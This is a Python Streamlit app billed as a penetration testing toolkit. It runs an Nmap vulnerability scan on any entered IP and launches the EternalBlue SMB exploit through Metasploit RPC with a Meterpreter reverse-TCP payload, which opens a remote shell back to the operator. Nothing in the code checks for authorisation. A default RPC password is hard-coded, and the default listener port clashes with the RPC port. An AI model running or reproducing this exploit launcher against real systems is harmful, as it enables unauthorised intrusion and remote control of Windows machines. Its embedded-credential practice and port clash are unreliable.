import streamlit as st
import nmap
import socket
from fpdf import FPDF
from pymetasploit3.msfrpc import MsfRpcClient

st.set_page_config(page_title="Penetration Testing Toolkit", layout="wide")
st.title("🔐 Penetration Testing Toolkit")

# Session state
if 'scan_result' not in st.session_state:
    st.session_state.scan_result = ""
if 'vuln_report' not in st.session_state:
    st.session_state.vuln_report = ""

# Step 1: Target IP
target_ip = st.text_input("🎯 Enter Target IP Address", "192.168.1.10")

# Step 2: Nmap Scan
if st.button("🔍 Run Nmap Scan"):
    st.info(f"Scanning {target_ip} using Nmap...")
    scanner = nmap.PortScanner()
    try:
        scanner.scan(target_ip, arguments='-sV --script vuln')
        result = scanner.csv()
        st.session_state.scan_result = result
        st.code(result)
    except Exception as e:
        st.error(f"Scan error: {e}")

# Step 3: Vulnerability Info
if st.session_state.scan_result:
    st.subheader("🛡️ Vulnerability Details")
    vuln_lines = [line for line in st.session_state.scan_result.splitlines() if "VULNERABLE" in line]
    if vuln_lines:
        st.session_state.vuln_report = "\n".join(vuln_lines)
        st.code(st.session_state.vuln_report)
    else:
        st.warning("No vulnerabilities found.")

# Step 4: Exploitation (Metasploit RPC)
st.subheader("💣 Exploitation (Metasploit RPC)")

with st.expander("🧩 Exploit Configuration"):
    exploit_module = st.text_input("Exploit Module", "exploit/windows/smb/ms17_010_eternalblue")
    payload_module = st.text_input("Payload Module", "windows/x64/meterpreter/reverse_tcp")
    lhost = socket.gethostbyname(socket.gethostname())
    lhost = st.text_input("LHOST (Your IP)", lhost)
    lport = st.number_input("LPORT", value=55553, step=1)
    rpc_pass = st.text_input("MSF RPC Password", type="password", value="rishi2003")
    rpc_port = st.number_input("MSF RPC Port", value=55553)

if st.button("🚀 Launch Exploit"):
    try:
        client = MsfRpcClient(password=rpc_pass, port=int(rpc_port), ssl=False)
        exploit = client.modules.use('exploit', exploit_module)
        payload = client.modules.use('payload', payload_module)

        exploit['RHOSTS'] = target_ip
        exploit['LHOST'] = lhost
        exploit['LPORT'] = int(lport)

        st.info(f"Launching {exploit_module} → {payload_module}...")
        job_id = exploit.execute(payload=payload)
        st.success(f"Exploit launched successfully! Job ID: {job_id}")
    except Exception as e:
        st.error(f"Exploit failed: {e}")

# Step 5: Report Generation
st.subheader("📝 Generate PDF Report")
if st.button("📄 Generate Report"):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Penetration Testing Report", ln=True, align='C')
    pdf.ln(10)

    pdf.multi_cell(0, 10, f"Target IP: {target_ip}")
    pdf.ln(5)
    pdf.multi_cell(0, 10, "Nmap Scan Results:")
    pdf.multi_cell(0, 10, st.session_state.scan_result)
    pdf.ln(5)
    pdf.multi_cell(0, 10, "Vulnerabilities Found:")
    pdf.multi_cell(0, 10, st.session_state.vuln_report or "None")

    file_path = f"pentest_report_{target_ip.replace('.', '_')}.pdf"
    pdf.output(file_path)
    st.success(f"Report generated: {file_path}")
    with open(file_path, "rb") as f:
        st.download_button("📥 Download Report", f, file_name=file_path)
